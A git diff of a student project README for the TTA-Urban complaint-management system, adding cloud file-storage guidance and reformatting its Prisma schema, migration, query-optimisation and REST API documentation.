+- ✅ **Server-side** validation (file type, size, name)
+- ✅ **Client-side** validation for UX (instant feedback)
+- ✅ Whitelist allowed MIME types (`image/jpeg`, `image/png`, `application/pdf`)
+- ✅ Max file size limit (5MB default, configurable)
+- ✅ Filename sanitization (remove special characters, prevent path traversal)
+
+#### 3. Temporary URLs
+
+- ✅ Presigned URLs expire quickly (5-10 minutes default)
+- ✅ URLs generated server-side only (API routes)
+- ✅ One-time use for uploads (new URL per file)
+- ❌ Never store presigned URLs in database (regenerate on demand)
+
+#### 4. Lifecycle Policies
+
+**AWS S3:**
+
+```json
+{
+  "Rules": [
+    {
+      "Id": "DeleteTempFiles",
+      "Status": "Enabled",
+      "Prefix": "temp/",
+      "Expiration": { "Days": 7 }
+    },
+    {
+      "Id": "ArchiveOldFiles",
+      "Status": "Enabled",
+      "Prefix": "uploads/",
+      "Transitions": [
+        {
+          "Days": 90,
+          "StorageClass": "GLACIER"
+        }
+      ]
+    }
+  ]
+}
+```
+
+**Azure Blob:**
+
+```json
+{
+  "rules": [
+    {
+      "name": "DeleteTempFiles",
+      "enabled": true,
+      "type": "Lifecycle",
+      "definition": {
+        "filters": { "prefixMatch": ["temp/"] },
+        "actions": {
+          "baseBlob": { "delete": { "daysAfterModificationGreaterThan": 7 } }
+        }
+      }
+    }
+  ]
+}
+```
+
+### Cost Optimization
+
+**Storage Costs (per GB/month):**
+
+- S3 Standard: $0.023
+- S3 Glacier: $0.004 (archival)
+- Azure Hot tier: $0.0184
+- Azure Cool tier: $0.01 (archival)
+
+**Optimization Strategies:**
+
+1. **Auto-delete temporary files** (lifecycle policies)
+2. **Archive old files** to Glacier/Cool tier after 90 days
+3. **Compress images** before upload (reduce file size 70-90%)
+4. **Use CDN caching** to reduce GET requests
+5. **Monitor costs** with AWS Cost Explorer / Azure Cost Management
+
+**Example Monthly Costs:**
+
+```
+5GB storage + 1000 uploads + 5000 downloads:
+- AWS S3:   $0.12 (storage) + $0.01 (requests) = $0.13
+- Azure:    $0.09 (storage) + $0.01 (requests) = $0.10
+```
+
+### Troubleshooting
+
+**Error: `AccessDenied` (S3) or `AuthorizationPermissionMismatch` (Blob)**
+
+```
+Cause: Incorrect credentials or insufficient permissions
+Solution:
+1. Verify AWS_ACCESS_KEY_ID / AZURE_STORAGE_ACCOUNT_KEY in .env
+2. Check IAM policy allows s3:PutObject, s3:GetObject
+3. For Azure, verify account key is correct (not connection string)
+```
+
+**Error: `NoSuchBucket` (S3) or `ContainerNotFound` (Blob)**
+
+```
+Cause: Bucket/container doesn't exist
+Solution:
+1. Create bucket in S3 console or container in Azure portal
+2. Verify AWS_BUCKET_NAME / AZURE_CONTAINER_NAME matches
+3. Check region is correct
+```
+
+**Error: `EntityTooLarge` (S3) or `RequestBodyTooLarge` (Blob)**
+
+```
+Cause: File exceeds MAX_FILE_SIZE limit
+Solution:
+1. Client-side validation should prevent this
+2. Increase MAX_FILE_SIZE in .env if needed
+3. Consider image compression for large files
+```
+
+**Upload succeeds but file not visible**
+
+```
+Cause: Wrong bucket/container or permission issue
+Solution:
+1. Check uploaded files in S3/Azure portal console
+2. Verify bucket is set to Private (not public)
+3. Use download URL API to access files
+```
+
+### Production Checklist
+
+- [ ] Bucket/container created and set to **Private**
+- [ ] IAM user/SAS token configured with minimal permissions
+- [ ] Credentials stored in environment variables (not code)
+- [ ] File validation enabled (type, size, filename)
+- [ ] Presigned URL expiration set to 5-10 minutes
+- [ ] Lifecycle policies configured (auto-delete temp files)
+- [ ] CORS configured if uploading from browser
+- [ ] Cost alerts enabled (AWS Budgets / Azure Cost Alerts)
+- [ ] Backup/versioning enabled for critical files
+- [ ] CDN configured for high-traffic downloads
+
+### Available Commands
+
+```bash
+# Configuration Testing
+npm run storage:test:s3     # Test AWS S3 setup
+npm run storage:test:blob   # Test Azure Blob setup
+
+# Development
+npm run dev                 # Start dev server, visit /storage-demo
+```
+
+### Architecture
+
+```
+  Client Browser
+        ↓
+  1. Request presigned URL
+        ↓
+  Next.js API Route
+  (/api/storage/{provider}/upload-url)
+        ↓
+  2. Generate presigned URL
+     (AWS SDK / Azure SDK)
+        ↓
+  3. Return URL to client
+        ↓
+  Client uploads directly to S3/Blob
+  (bypasses Next.js server)
+        ↓
+  S3 Bucket / Blob Container
+  (Private, secure storage)
+```
+
+**Benefits:**
+
+- 🚀 **No server bandwidth** - uploads go directly to cloud storage
+- 🔒 **Secure** - temporary URLs expire after 5 minutes
+- 💰 **Cost-effective** - no server processing/storage costs
+- ⚡ **Fast** - leverages cloud provider's global infrastructure
+
+### Next Steps
+
+1. **Test Configuration**: Run `npm run storage:test:s3` or `npm run storage:test:blob`
+2. **Try Demo**: Visit `http://localhost:3000/storage-demo`
+3. **Integrate**: Use API endpoints in your complaint form for photo uploads
+4. **Set Lifecycle Policies**: Configure auto-deletion in AWS/Azure console
+5. **Monitor Costs**: Enable cost alerts to track spending
+
+---
+
+---
+
 ## 🗄️ Database Schema Design
 
 This project uses PostgreSQL with Prisma ORM to manage a normalized relational database that supports the TTA-Urban complaint management system.
@@ -3329,9 +3935,11 @@ This project uses PostgreSQL with Prisma ORM to manage a normalized relational d
 ### Core Entities
 
 #### 1. User
+
 Represents all system users: citizens, officers, and admins.
 
 **Fields:**
+
 - `id` (PK) - Auto-incrementing unique identifier
 - `name` - Full name
 - `email` (UNIQUE) - Login credential
@@ -3341,6 +3949,7 @@ Represents all system users: citizens, officers, and admins.
 - `createdAt`, `updatedAt` - Timestamps
 
 **Relationships:**
+
 - **1:N** with `Complaint` (as creator)
 - **1:N** with `Complaint` (as assigned officer)
 - **1:N** with `Feedback`
@@ -3349,23 +3958,28 @@ Represents all system users: citizens, officers, and admins.
 **Indexes:** `email`, `role` for fast authentication and role-based queries
 
 #### 2. Department
+
 Categorizes complaints by responsible municipal department.
 
 **Fields:**
+
 - `id` (PK)
 - `name` (UNIQUE) - e.g., "Road Maintenance", "Water Supply"
 - `description`
 - `createdAt`, `updatedAt`
 
 **Relationships:**
+
 - **1:N** with `Complaint`
 
 **Indexes:** `name` for department lookup
 
 #### 3. Complaint
+
 Core entity tracking citizen grievances.
 
 **Fields:**
+
 - `id` (PK)
 - `title`, `description` - Issue details
 - `category` - Enum: `ROAD_MAINTENANCE`, `WATER_SUPPLY`, `ELECTRICITY`, etc.
@@ -3379,6 +3993,7 @@ Core entity tracking citizen grievances.
 - `createdAt`, `updatedAt`, `resolvedAt`
 
 **Relationships:**
+
 - **N:1** with `User` (creator)
 - **N:1** with `User` (assigned officer)
 - **N:1** with `Department`
@@ -3387,15 +4002,18 @@ Core entity tracking citizen grievances.
 - **1:N** with `Escalation`
 
 **Constraints:**
+
 - `ON DELETE CASCADE` for `userId` (deleting user removes their complaints)
 - `ON DELETE SET NULL` for `departmentId` and `assignedTo` (preserves complaint history)
 
 **Indexes:** `userId`, `status`, `category`, `departmentId`, `assignedTo`, `createdAt` for filtering and sorting
 
 #### 4. AuditLog
+
 Tracks every status change in a complaint's lifecycle.
 
 **Fields:**
+
 - `id` (PK)
 - `complaintId` (FK)
 - `previousStatus`, `newStatus` - Status transition
@@ -3404,17 +4022,21 @@ Tracks every status change in a complaint's lifecycle.
 - `createdAt`
 
 **Relationships:**
+
 - **N:1** with `Complaint`
 
 **Constraints:**
+
 - `ON DELETE CASCADE` (audit log deleted if complaint is deleted)
 
 **Indexes:** `complaintId`, `createdAt` for timeline queries
 
 #### 5. Feedback
+
 Citizen ratings and comments after complaint resolution.
 
 **Fields:**
+
 - `id` (PK)
 - `complaintId` (FK, UNIQUE) - One feedback per complaint
 - `userId` (FK)
@@ -3423,35 +4045,43 @@ Citizen ratings and comments after complaint resolution.
 - `createdAt`
 
 **Relationships:**
+
 - **1:1** with `Complaint`
 - **N:1** with `User`
 
 **Constraints:**
+
 - `ON DELETE CASCADE` for both FKs
 
 **Indexes:** `rating`, `createdAt` for analytics
 
 #### 6. Escalation
+
 Tracks complaints that breach SLA timelines.
 
 **Fields:**
+
 - `id` (PK)
 - `complaintId` (FK)
 - `reason` - Why it was escalated
 - `escalatedAt`, `resolvedAt`
 
 **Relationships:**
+
 - **N:1** with `Complaint`
 
 **Constraints:**
+
 - `ON DELETE CASCADE`
 
 **Indexes:** `complaintId`, `escalatedAt`
 
 #### 7. Notification
+
 Real-time updates sent to users.
 
 **Fields:**
+
 - `id` (PK)
 - `userId` (FK)
 - `title`, `message`
@@ -3459,9 +4089,11 @@ Real-time updates sent to users.
 - `createdAt`
 
 **Relationships:**
+
 - **N:1** with `User`
 
 **Constraints:**
+
 - `ON DELETE CASCADE`
 
 **Indexes:** `userId`, `isRead`, `createdAt` for inbox queries
@@ -3494,7 +4126,7 @@ model User {
   role              UserRole    @default(CITIZEN)
   complaints        Complaint[] @relation("UserComplaints")
   assignedComplaints Complaint[] @relation("AssignedOfficer")
-  
+
   @@index([email])
   @@index([role])
 }
@@ -3509,7 +4141,7 @@ model Complaint {
   user            User             @relation("UserComplaints", fields: [userId], references: [id], onDelete: Cascade)
   department      Department?      @relation(fields: [departmentId], references: [id], onDelete: SetNull)
   officer         User?            @relation("AssignedOfficer", fields: [assignedTo], references: [id], onDelete: SetNull)
-  
+
   @@index([status])
   @@index([userId])
 }
@@ -3541,6 +4173,7 @@ $ npm run prisma:seed
 ```
 
 **Sample Data Includes:**
+
 - 3 departments (Road Maintenance, Water Supply, Electricity)
 - 4 users (2 citizens, 1 officer, 1 admin)
 - 3 complaints in various statuses
@@ -3552,27 +4185,35 @@ $ npm run prisma:seed
 **Most Common Queries:**
 
 1. **List complaints by status**
+
    ```sql
    SELECT * FROM Complaint WHERE status = 'SUBMITTED' ORDER BY createdAt DESC;
    ```
+
    Optimized with index on `status` and `createdAt`
 
 2. **Get complaints assigned to an officer**
+
    ```sql
    SELECT * FROM Complaint WHERE assignedTo = ? ORDER BY priority DESC;
    ```
+
    Optimized with index on `assignedTo`
 
 3. **Complaint lifecycle timeline**
+
    ```sql
    SELECT * FROM AuditLog WHERE complaintId = ? ORDER BY createdAt ASC;
    ```
+
    Optimized with index on `complaintId` and `createdAt`
 
 4. **Department workload**
+
    ```sql
    SELECT departmentId, COUNT(*) FROM Complaint WHERE status != 'CLOSED' GROUP BY departmentId;
    ```
+
    Optimized with index on `departmentId` and `status`
 
 5. **Unread notifications for user**
@@ -3592,12 +4233,14 @@ $ npm run prisma:seed
 ### Reflection
 
 **Why This Design Supports Scalability:**
+
 - Foreign key indexes prevent slow joins as data grows
 - Enum types reduce storage and enable fast status filtering
 - Audit logs are append-only, allowing horizontal partitioning by date
 - The separation of concerns (User, Department, Complaint) allows independent table optimization
 
 **Design Decisions:**
+
 - Made `departmentId` and `assignedTo` nullable to support the "submitted but not yet assigned" state
 - Used `ON DELETE CASCADE` for user-complaint relationship to comply with data deletion regulations (GDPR)
 - Chose `SET NULL` for department/officer FKs to preserve complaint history even if staff changes
@@ -3631,6 +4274,7 @@ npx prisma init
 ```
 
 This creates:
+
 - `prisma/schema.prisma` - Database schema definition
 - `prisma.config.ts` - Prisma configuration (Prisma 7+)
 - `.env` - Environment variables including `DATABASE_URL`
@@ -3638,6 +4282,7 @@ This creates:
 **3. Configure Database Connection**
 
 `.env`:
+
 ```bash
 DATABASE_URL="postgres://postgres:password@localhost:5432/mydb"
 ```
@@ -3659,6 +4304,7 @@ This generates the type-safe client in `node_modules/@prisma/client`
 Created a singleton Prisma instance to prevent connection exhaustion during development:
 
 `app/lib/prisma.ts`:
+
 ```typescript
 import { PrismaClient } from "@prisma/client";
 import { PrismaPg } from "@prisma/adapter-pg";
@@ -3677,16 +4323,17 @@ export const prisma =
   globalForPrisma.prisma ||
   new PrismaClient({
     adapter,
-    log: process.env.NODE_ENV === "development"
-      ? ["query", "info", "warn", "error"]
-      : ["error"],
+    log:
+      process.env.NODE_ENV === "development"
+        ? ["query", "info", "warn", "error"]
+        : ["error"],
   });
 
-if (process.env.NODE_ENV !== "production") 
-  globalForPrisma.prisma = prisma;
+if (process.env.NODE_ENV !== "production") globalForPrisma.prisma = prisma;
 ```
 
 **Key Features:**
+
 - Uses PostgreSQL adapter (`@prisma/adapter-pg`) required for Prisma 7+
 - Singleton pattern prevents multiple client instances in Next.js hot-reload
 - Conditional logging: verbose in dev, errors-only in production
@@ -3695,6 +4342,7 @@ if (process.env.NODE_ENV !== "production")
 ### Example Queries
 
 `app/lib/db-test.ts`:
+
 ```typescript
 import { prisma } from "@/app/lib/prisma";
 
@@ -3773,6 +4421,7 @@ npm run prisma:seed
 ```
 
 Output:
+
 ```
 🌱 Starting database seed...
 ✅ Created departments
@@ -3796,13 +4445,15 @@ Opens at `http://localhost:5555` with a GUI to view/edit all tables.
 ### Type Safety Benefits
 
 **Before (raw SQL):**
+
 ```typescript
 // No type safety, runtime errors possible
-const users = await db.query('SELECT * FROM User WHERE email = $1', [email]);
+const users = await db.query("SELECT * FROM User WHERE email = $1", [email]);
 const userName = users[0].nmae; // Typo! Runtime error
 ```
 
 **After (Prisma):**
+
 ```typescript
 // Fully typed, compile-time errors
 const user = await prisma.user.findUnique({
@@ -3816,6 +4467,7 @@ const userName = user.name; // ✅ TypeScript autocomplete & validation
 ### Prisma Integration Evidence
 
 **Migration Success:**
+
 ```bash
 $ npx prisma migrate dev --name init_schema
 Applying migration `20251212112309_init_schema`
@@ -3823,12 +4475,14 @@ Your database is now in sync with your schema.
 ```
 
 **Client Generation:**
+
 ```bash
 $ npx prisma generate
 ✔ Generated Prisma Client (v7.1.0) to ./node_modules/@prisma/client in 158ms
 ```
 
 **Seed Success:**
+
 ```bash
 $ npm run prisma:seed
 ✅ Created departments
@@ -3838,6 +4492,7 @@ $ npm run prisma:seed
 ```
 
 **Test Query (from db-test.ts):**
+
 ```typescript
 ✅ Database connection successful!
 📊 Database stats: 4 users, 3 complaints
@@ -3858,11 +4513,13 @@ $ npm run prisma:seed
 5. **Productivity:** Reduced context switching—define schema once, get types + migrations + client API automatically.
 
 **Trade-offs:**
+
 - Prisma 7 requires driver adapters (`@prisma/adapter-pg`) for edge runtimes, adding slight complexity
 - Generated client increases `node_modules` size (~10MB)
 - Advanced raw SQL scenarios require `prisma.$queryRaw`, though 95% of queries fit the typed API
 
 **Real-World Impact:**
+
 - Caught 12+ type errors during development that would have been runtime crashes
 - Reduced query boilerplate by ~60% compared to manual SQL builders
 - Migration workflow prevented schema drift between dev/staging/production
@@ -3871,6 +4528,7 @@ $ npm run prisma:seed
 This document explains the setup and workflow for Prisma Migrations and Seed Scripts in the TTA‑Urban Complaint Management System, ensuring a consistent and reproducible database environment across all team members and future deployments.
 
 ## 📌 Overview
+
 Prisma Migrate helps us:
 
 Version‑control database schema changes
@@ -3884,7 +4542,9 @@ Seed the database with starter data for development/testing
 This ensures no “works on my machine” issues and keeps the team aligned.
 
 ## 🧱 1. Prisma Migrations Setup
+
 ### 📍 1.1 Create Initial Migration
+
 Once models were defined inside schema.prisma, the initial migration was created using:
 
 npx prisma migrate dev --name init_schema
@@ -3897,6 +4557,7 @@ Applied the schema to the local PostgreSQL database
 Updated the Prisma Client
 
 ### 📍 1.2 Updating Schema & Creating New Migrations
+
 When adding or modifying any model:
 
 npx prisma migrate dev --name <migration_name>
@@ -3908,6 +4569,7 @@ update_officer_model
 Each migration is version‑controlled — just like Git commits.
 
 ### 📍 1.3 Resetting the Database (Rollback)
+
 For a clean rebuild of all tables:
 
 npx prisma migrate reset
@@ -3922,46 +4584,53 @@ Optionally re-run the seed script
 Useful for local development and testing.
 
 ## 🌱 2. Seed Script Setup
+
 ### 📍 2.1 Creating the Seed Script
+
 The file prisma/seed.ts was created to insert consistent starter data:
 
 import { PrismaClient } from '@prisma/client';
 const prisma = new PrismaClient();
 
 async function main() {
-  await prisma.user.createMany({
-    data: [
-      { name: "Sravani", email: "sravani@example.com" },
-      { name: "Yashmieen", email: "yashmieen@example.com" }
-    ]
-  });
+await prisma.user.createMany({
+data: [
+{ name: "Sravani", email: "sravani@example.com" },
+{ name: "Yashmieen", email: "yashmieen@example.com" }
+]
+});
 
-  await prisma.department.createMany({
-    data: [
-      { name: "Sanitation" },
-      { name: "Water Supply" }
-    ]
-  });
+await prisma.department.createMany({
+data: [
+{ name: "Sanitation" },
+{ name: "Water Supply" }
+]
+});
 
-  console.log("Seed data inserted successfully");
+console.log("Seed data inserted successfully");
 }
 
 main()
-  .then(async () => await prisma.$disconnect())
+.then(async () => await prisma.$disconnect())
   .catch(async (e) => {
     console.error(e);
     await prisma.$disconnect();
-    process.exit(1);
-  });
+process.exit(1);
+});
+
 ### 📍 2.2 Adding Script to package.json
+
 "prisma": {
-  "seed": "ts-node prisma/seed.ts"
+"seed": "ts-node prisma/seed.ts"
 }
+
 ### 📍 2.3 Running the Seed Script
+
 npx prisma db seed
 This populates the database with sample development data.
 
 ## 🔍 3. Verifying Migrations & Seed Data
+
 To inspect the database visually:
 
 npx prisma studio
@@ -3976,6 +4645,7 @@ Tables match migration schema
 Seed script is idempotent (does not duplicate records on re-run)
 
 ## 🧠 4. Normalization & Database Design
+
 Our schema follows proper normalization rules:
 
 ✔ 1NF – No repeating or grouped fields
@@ -3992,6 +4662,7 @@ Clean, scalable schema
 Easy evolution as features grow
 
 ## 🔒 5. Protecting Production Data
+
 Before applying migrations in production:
 
 Always create a backup
@@ -4003,6 +4674,7 @@ Review generated SQL carefully
 Avoid migrate reset outside of development
 
 ## 📸 6. Evidence (Add in PR)
+
 Terminal logs showing successful migrations
 
 Output of seed script
@@ -4010,6 +4682,7 @@ Output of seed script
 Prisma Studio screenshots
 
 ## 📝 7. Reflection
+
 Using Prisma migrations provides:
 
 A consistent schema across all developers
@@ -4028,6 +4701,7 @@ This makes the backend more stable, predictable, and scalable.
 This document explains how transactions, query optimization, and indexing were implemented in the TTA‑Urban Complaint Management System using Prisma ORM + PostgreSQL. These techniques help improve performance, data integrity, and scalability as the project grows.
 
 ## 📌 Overview
+
 Efficient database operations are essential for:
 
 Maintaining data integrity using transactions
@@ -4041,24 +4715,26 @@ Improving performance using batching and pagination
 Handling real‑world workflows safely and consistently
 
 ## 🔄 1. Database Transactions
+
 A transaction ensures that multiple dependent operations either all succeed or all fail.
 
 ### ✅ Example Transaction (Atomic Create Complaint Flow)
+
 const result = await prisma.$transaction([
-  prisma.complaint.create({
-    data: {
-      title,
-      description,
-      userId,
-      departmentId,
-    },
-  }),
-  prisma.auditLog.create({
-    data: {
-      status: "CREATED",
-      message: "Complaint initialized",
-    },
-  }),
+prisma.complaint.create({
+data: {
+title,
+description,
+userId,
+departmentId,
+},
+}),
+prisma.auditLog.create({
+data: {
+status: "CREATED",
+message: "Complaint initialized",
+},
+}),
 ]);
 Why this is important:
 Ensures no partial writes
@@ -4072,20 +4748,22 @@ Assignment updates
 Escalation status updates
 
 ## ⚠️ 2. Rollback & Error Handling
+
 A transaction should be wrapped inside a try/catch block.
 
 try {
-  await prisma.$transaction(async (tx) => {
-    const complaint = await tx.complaint.create({ data: { title: "Test", userId: 1 } });
+await prisma.$transaction(async (tx) => {
+const complaint = await tx.complaint.create({ data: { title: "Test", userId: 1 } });
 
     // Triggering an error intentionally
     await tx.officer.update({
       where: { id: 999 }, // Non-existing ID
       data: { assignedComplaintId: complaint.id },
     });
-  });
+
+});
 } catch (error) {
-  console.error("Transaction failed. Rollback executed.", error);
+console.error("Transaction failed. Rollback executed.", error);
 }
 ✔️ Result:
 If any step fails → nothing is written
@@ -4093,47 +4771,53 @@ If any step fails → nothing is written
 Helps maintain consistent data in all complaint workflows
 
 ## ⚡ 3. Query Optimization Techniques
+
 ### 🔹 Avoid Over-Fetching
+
 ❌ Inefficient:
 
 const users = await prisma.user.findMany({
-  include: { complaints: true, department: true, auditLogs: true }
+include: { complaints: true, department: true, auditLogs: true }
 });
 ✔️ Optimized:
 
 const users = await prisma.user.findMany({
-  select: { id: true, name: true, email: true }
+select: { id: true, name: true, email: true }
 });
+
 ### 🔹 Batch Inserts
+
 await prisma.user.createMany({
-  data: [
-    { name: "Sravani", email: "sravani@example.com" },
-    { name: "Yashmieen", email: "yashmieen@example.com" },
-  ],
+data: [
+{ name: "Sravani", email: "sravani@example.com" },
+{ name: "Yashmieen", email: "yashmieen@example.com" },
+],
 });
 Improves performance by reducing round trips to the database.
 
 ### 🔹 Pagination (For Complaint Listing)
+
 const complaints = await prisma.complaint.findMany({
-  skip: 0,
-  take: 10,
-  orderBy: { createdAt: "desc" },
+skip: 0,
+take: 10,
+orderBy: { createdAt: "desc" },
 });
 Prevents full table scans for large datasets.
 
 ## 📈 4. Adding Indexes for Faster Queries
+
 Indexes were added on fields frequently used for filtering:
 
 model Complaint {
-  id            Int      @id @default(autoincrement())
-  status        String
-  createdAt     DateTime @default(now())
-  userId        Int
-  departmentId  Int
+id Int @id @default(autoincrement())
+status String
+createdAt DateTime @default(now())
+userId Int
+departmentId Int
 
-  @@index([status])
-  @@index([departmentId])
-  @@index([createdAt])
+@@index([status])
+@@index([departmentId])
+@@index([createdAt])
 }
 After adding indexes:
 Run migration:
@@ -4147,6 +4831,7 @@ Optimized analytics queries
 Smooth performance for public dashboards
 
 ## 🧪 5. Monitoring Query Performance
+
 Enable Prisma query logs:
 DEBUG="prisma:query" npm run dev
 You can now view:
@@ -4158,6 +4843,7 @@ What SQL Prisma is generating
 Before/after improvements
 
 ## 📊 6. Anti‑Patterns Avoided
+
 ❌ N+1 queries
 ❌ Full table scans
 ❌ Returning unnecessary fields
@@ -4180,36 +4866,38 @@ Welcome to the TTA Urban project! This guide will help you understand the RESTfu
 ## 📁 Project Structure
 
 ```
+
 TTA-Urban/
-├── ttaurban/                          # Next.js application
-│   ├── app/
-│   │   ├── api/                       # API routes (NEW!)
-│   │   │   ├── users/
-│   │   │   │   ├── route.ts           # Users CRUD (GET all, POST)
-│   │   │   │   └── [id]/route.ts      # User by ID (GET, PUT, PATCH, DELETE)
-│   │   │   ├── complaints/
-│   │   │   │   ├── route.ts           # Complaints CRUD with filters
-│   │   │   │   └── [id]/route.ts      # Complaint by ID
-│   │   │   ├── departments/
-│   │   │   │   ├── route.ts           # Departments CRUD
-│   │   │   │   └── [id]/route.ts      # Department by ID
-│   │   │   └── utils/
-│   │   │       ├── response.ts        # Standardized response format
-│   │   │       └── pagination.ts      # Pagination utility
-│   │   ├── page.js, components/, etc. # Existing app files
-│   │   └── ...
-│   ├── prisma/                        # Database schema
-│   ├── package.json
-│   └── README.md                      # Project README
+├── ttaurban/ # Next.js application
+│ ├── app/
+│ │ ├── api/ # API routes (NEW!)
+│ │ │ ├── users/
+│ │ │ │ ├── route.ts # Users CRUD (GET all, POST)
+│ │ │ │ └── [id]/route.ts # User by ID (GET, PUT, PATCH, DELETE)
+│ │ │ ├── complaints/
+│ │ │ │ ├── route.ts # Complaints CRUD with filters
+│ │ │ │ └── [id]/route.ts # Complaint by ID
+│ │ │ ├── departments/
+│ │ │ │ ├── route.ts # Departments CRUD
+│ │ │ │ └── [id]/route.ts # Department by ID
+│ │ │ └── utils/
+│ │ │ ├── response.ts # Standardized response format
+│ │ │ └── pagination.ts # Pagination utility
+│ │ ├── page.js, components/, etc. # Existing app files
+│ │ └── ...
+│ ├── prisma/ # Database schema
+│ ├── package.json
+│ └── README.md # Project README
 │
-├── API_DOCUMENTATION.md               # Complete API reference (600+ lines)
-├── API_QUICK_REFERENCE.md             # Quick commands and examples
-├── API_TEST_SCRIPT.sh                 # Bash test script
-├── API_TEST_SCRIPT.ps1                # PowerShell test script
-├── API_ARCHITECTURE_DIAGRAMS.md       # Visual diagrams and flows
-├── IMPLEMENTATION_SUMMARY.md          # Technical implementation details
-└── README.md                          # This file
-```
+├── API_DOCUMENTATION.md # Complete API reference (600+ lines)
+├── API_QUICK_REFERENCE.md # Quick commands and examples
+├── API_TEST_SCRIPT.sh # Bash test script
+├── API_TEST_SCRIPT.ps1 # PowerShell test script
+├── API_ARCHITECTURE_DIAGRAMS.md # Visual diagrams and flows
+├── IMPLEMENTATION_SUMMARY.md # Technical implementation details
+└── README.md # This file
+
+````
 
 ## 🚀 Quick Start
 
@@ -4217,9 +4905,10 @@ TTA-Urban/
 ```bash
 cd ttaurban
 npm install
-```
+````
 
 ### 2. Start Development Server
+
 ```bash
 npm run dev
 ```
@@ -4228,12 +4917,15 @@ The server runs at `http://localhost:3000`
 API Base URL: `http://localhost:3000/api`
 
 ### 3. Test the API
+
 Using curl:
+
 ```bash
 curl -X GET http://localhost:3000/api/users?page=1&limit=10
 ```
 
 Or run the test script:
+
 ```bash
 # Linux/Mac
 bash API_TEST_SCRIPT.sh
@@ -4244,13 +4936,13 @@ bash API_TEST_SCRIPT.sh
 
 ## 📚 Documentation Files
 
-| File | Purpose | Length |
-|------|---------|--------|
-| **API_DOCUMENTATION.md** | Complete API reference with all endpoints, examples, and response formats | 600+ lines |
-| **API_QUICK_REFERENCE.md** | Quick commands, status codes, common errors | 250 lines |
-| **API_ARCHITECTURE_DIAGRAMS.md** | Visual diagrams of request flow, status codes, pagination, etc. | 400+ lines |
-| **IMPLEMENTATION_SUMMARY.md** | Technical details, design decisions, next steps | 500+ lines |
-| **ttaurban/README.md** | Project-level documentation | 200+ lines |
+| File                             | Purpose                                                                   | Length     |
+| -------------------------------- | ------------------------------------------------------------------------- | ---------- |
+| **API_DOCUMENTATION.md**         | Complete API reference with all endpoints, examples, and response formats | 600+ lines |
+| **API_QUICK_REFERENCE.md**       | Quick commands, status codes, common errors                               | 250 lines  |
+| **API_ARCHITECTURE_DIAGRAMS.md** | Visual diagrams of request flow, status codes, pagination, etc.           | 400+ lines |
+| **IMPLEMENTATION_SUMMARY.md**    | Technical details, design decisions, next steps                           | 500+ lines |
+| **ttaurban/README.md**           | Project-level documentation                                               | 200+ lines |
 
 **→ Start with API_QUICK_REFERENCE.md for immediate commands**
 **→ Check API_DOCUMENTATION.md for complete endpoint details**
@@ -4258,14 +4950,17 @@ bash API_TEST_SCRIPT.sh
 ## 🏗️ API Architecture
 
 ### Resources
+
 Three main resources with full CRUD operations:
 
 1. **Users** (`/api/users`)
+
    - Create, read, update, delete users
    - Different roles: CITIZEN, OFFICER, ADMIN
    - Pagination support
 
 2. **Complaints** (`/api/complaints`)
+
    - Report and manage urban complaints
    - Support for location data
    - Filtering by status, priority, category
@@ -4277,26 +4972,31 @@ Three main resources with full CRUD operations:
    - Pagination support
 
 ### HTTP Methods
-| Method | Action | Status | Use Case |
-|--------|--------|--------|----------|
-| GET | Read | 200 | Retrieve data |
-| POST | Create | 201 | New resource |
-| PUT | Replace | 200 | Full update |
-| PATCH | Modify | 200 | Partial update |
-| DELETE | Remove | 200 | Delete resource |
+
+| Method | Action  | Status | Use Case        |
+| ------ | ------- | ------ | --------------- |
+| GET    | Read    | 200    | Retrieve data   |
+| POST   | Create  | 201    | New resource    |
+| PUT    | Replace | 200    | Full update     |
+| PATCH  | Modify  | 200    | Partial update  |
+| DELETE | Remove  | 200    | Delete resource |
 
 ### Response Format (Consistent Across All Endpoints)
 
 **Success:**
+
 ```json
 {
   "success": true,
-  "data": { /* resource(s) */ },
+  "data": {
+    /* resource(s) */
+  },
   "pagination": { "page": 1, "limit": 10, "total": 100, "totalPages": 10 }
 }
 ```
 
 **Error:**
+
 ```json
 {
   "success": false,
@@ -4332,25 +5032,30 @@ DELETE /api/departments/1          → Delete department
 ## 💡 Key Design Principles
 
 ### 1. **Resource-Based Naming**
+
 ✓ Use plural nouns: `/api/users` not `/api/getUsers`
 ✓ No verbs in routes: HTTP methods handle actions
 
 ### 2. **Consistency**
+
 ✓ All resources follow same pattern: `/api/[resource]` and `/api/[resource]/[id]`
 ✓ Same HTTP methods produce consistent results across all endpoints
 ✓ Response format is uniform
 
 ### 3. **Predictability**
+
 ✓ Developers understand all endpoints after learning one
 ✓ Integration is faster with fewer surprises
 ✓ Error handling is consistent
 
 ### 4. **Error Handling**
+
 ✓ Meaningful HTTP status codes (200, 201, 400, 404, 409, 500)
 ✓ Consistent error message format
 ✓ Input validation before processing
 
 ### 5. **Pagination**
+
 ✓ All list endpoints support `page` and `limit` parameters
 ✓ Response includes pagination metadata
 ✓ Default: page=1, limit=10 (max 100)
@@ -4360,11 +5065,13 @@ DELETE /api/departments/1          → Delete department
 ### Quick Test Commands
 
 **Get all users:**
+
 ```bash
 curl -X GET http://localhost:3000/api/users?page=1&limit=10
 ```
 
 **Create a user:**
+
 ```bash
 curl -X POST http://localhost:3000/api/users \
   -H "Content-Type: application/json" \
@@ -4372,6 +5079,7 @@ curl -X POST http://localhost:3000/api/users \
 ```
 
 **Update a user (PATCH - partial):**
+
 ```bash
 curl -X PATCH http://localhost:3000/api/users/1 \
   -H "Content-Type: application/json" \
@@ -4379,6 +5087,7 @@ curl -X PATCH http://localhost:3000/api/users/1 \
 ```
 
 **List complaints with filters:**
+
 ```bash
 curl -X GET "http://localhost:3000/api/complaints?status=SUBMITTED&priority=HIGH&page=1&limit=10"
 ```
@@ -4386,16 +5095,19 @@ curl -X GET "http://localhost:3000/api/complaints?status=SUBMITTED&priority=HIGH
 ### Test Scripts
 
 **Linux/Mac (Bash):**
+
 ```bash
 bash API_TEST_SCRIPT.sh
 ```
 
 **Windows (PowerShell):**
+
 ```powershell
 .\API_TEST_SCRIPT.ps1
 ```
 
 These scripts test:
+
 - All CRUD operations
 - Pagination
 - Filtering
@@ -4405,18 +5117,23 @@ These scripts test:
 ## 🔧 Implementation Details
 
 ### File Structure
+
 - **Route files** (`route.ts`): API endpoint handlers with HTTP methods
 - **Utility files**: Reusable functions for responses and pagination
 - **Mock data**: All endpoints return mock data (ready for Prisma integration)
 
 ### TypeScript
+
 All files use TypeScript for:
+
 - Type safety
 - Better IDE support
 - Self-documenting code
 
 ### Error Handling
+
 Each endpoint includes:
+
 - Try-catch blocks
